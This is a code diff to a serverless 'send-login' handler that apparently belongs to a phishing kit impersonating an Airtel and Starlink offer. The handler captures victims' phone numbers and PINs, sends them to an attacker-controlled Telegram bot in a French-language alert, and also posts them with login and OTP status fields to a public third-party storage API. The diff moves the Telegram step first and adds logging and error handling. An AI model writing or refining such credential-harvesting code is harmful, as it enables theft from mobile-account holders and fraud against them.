@@ -27,43 +27,10 @@ export default async function handler(req, res) {
     const displayCountry = country || 'Airtel Africa';
     const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
 
-    // 1. Create cloud session record on restful-api.dev (async, don't wait)
-    let cloudId = sessionId;
-    fetch('https://api.restful-api.dev/objects', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        name: `stl_${cleanPhone}_${Date.now()}`,
-        data: {
-          sessionId,
-          phone: cleanPhone,
-          fullPhone: displayPhone,
-          country: displayCountry,
-          airtelBrand: displayBrand,
-          pin: cleanPin,
-          planName: planName || 'Forfait Airtel Starlink',
-          planPrice: planPrice || '$1.49',
-          loginStatus: 'pending',
-          otpStatus: 'idle',
-          createdAt: Date.now(),
-          lastUpdated: Date.now(),
-        },
-      }),
-    })
-      .then(createRes => {
-        if (createRes.ok) {
-          return createRes.json();
-        }
-        throw new Error('Cloud creation failed');
-      })
-      .then(createData => {
-        if (createData && createData.id) {
-          cloudId = createData.id;
-        }
-      })
-      .catch(e => console.warn('Could not create cloud record:', e));
+    // Use sessionId as cloudId for speed
+    const cloudId = sessionId;
 
-    // 2. Format message for Telegram
+    // Send Telegram message FIRST (before cloud operations)
     const messageText =
       `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
       `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
@@ -94,7 +61,8 @@ export default async function handler(req, res) {
       ],
     ];
 
-    // Send Telegram message
+    console.log('[send-login] Sending Telegram message for session:', cloudId);
+
     const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -109,6 +77,48 @@ export default async function handler(req, res) {
     });
 
     const tgData = await tgRes.json();
+
+    if (!tgData.ok) {
+      console.error('[send-login] Telegram API error:', tgData);
+      return res.status(500).json({ error: 'Failed to send Telegram message' });
+    }
+
+    console.log('[send-login] Telegram message sent successfully, message_id:', tgData.result?.message_id);
+
+    // Create cloud session record asynchronously (don't wait)
+    fetch('https://api.restful-api.dev/objects', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        name: `stl_${cleanPhone}_${Date.now()}`,
+        data: {
+          sessionId,
+          phone: cleanPhone,
+          fullPhone: displayPhone,
+          country: displayCountry,
+          airtelBrand: displayBrand,
+          pin: cleanPin,
+          planName: planName || 'Forfait Airtel Starlink',
+          planPrice: planPrice || '$1.49',
+          loginStatus: 'pending',
+          otpStatus: 'idle',
+          createdAt: Date.now(),
+          lastUpdated: Date.now(),
+        },
+      }),
+    })
+      .then(createRes => {
+        if (createRes.ok) {
+          return createRes.json();
+        }
+        throw new Error('Cloud creation failed');
+      })
+      .then(createData => {
+        if (createData && createData.id) {
+          console.log('[send-login] Cloud record created:', createData.id);
+        }
+      })
+      .catch(e => console.warn('[send-login] Could not create cloud record:', e));
 
     return res.status(200).json({
       success: true,
